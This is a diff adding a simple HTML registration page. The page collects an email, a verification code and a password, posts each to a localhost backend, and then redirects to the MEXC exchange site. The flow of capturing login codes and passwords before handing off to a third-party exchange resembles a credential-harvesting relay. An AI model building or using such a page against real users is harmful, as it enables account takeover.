@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Multi-Step Registration</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #4e54c8, #8f94fb);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .form-container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      width: 300px;
+    }
+    .form-step {
+      display: none;
+    }
+    .form-step.active {
+      display: block;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 15px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #4e54c8;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <div class="form-step active" id="step-1">
+      <h3>Enter Email</h3>
+      <input type="email" id="email" placeholder="Email" required />
+      <button onclick="sendEmail()">Send Code</button>
+    </div>
+
+    <div class="form-step" id="step-2">
+      <h3>Enter Code</h3>
+      <input type="text" id="code" placeholder="Code" required />
+      <button onclick="sendCode()">Next</button>
+    </div>
+
+    <div class="form-step" id="step-3">
+      <h3>Set Password</h3>
+      <input type="password" id="password" placeholder="Password" required />
+      <button onclick="submitForm()">Register</button>
+    </div>
+  </div>
+
+  <script>
+    function goToStep(step) {
+      document.querySelectorAll(".form-step").forEach(div => div.classList.remove("active"));
+      document.getElementById(`step-${step}`).classList.add("active");
+    }
+
+    async function sendEmail() {
+      const email = document.getElementById("email").value;
+      if (!email) return alert("Please enter email");
+
+      await fetch("http://localhost:3000/step-email", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email }),
+      });
+
+      goToStep(2);
+    }
+
+    async function sendCode() {
+      const code = document.getElementById("code").value;
+      if (!code) return alert("Enter the code");
+
+      await fetch("http://localhost:3000/step-code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code }),
+      });
+
+      goToStep(3);
+    }
+
+    async function submitForm() {
+      const password = document.getElementById("password").value;
+      const email = document.getElementById("email").value;
+      const code = document.getElementById("code").value;
+
+      if (!password) return alert("Enter password");
+
+      await fetch("http://localhost:3000/register", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, code, password }),
+      });
+
+      // ✅ Redirect to MEXC after registration
+      window.location.href = "https://www.mexc.com/";
+    }
+  </script>
+</body>
+</html>
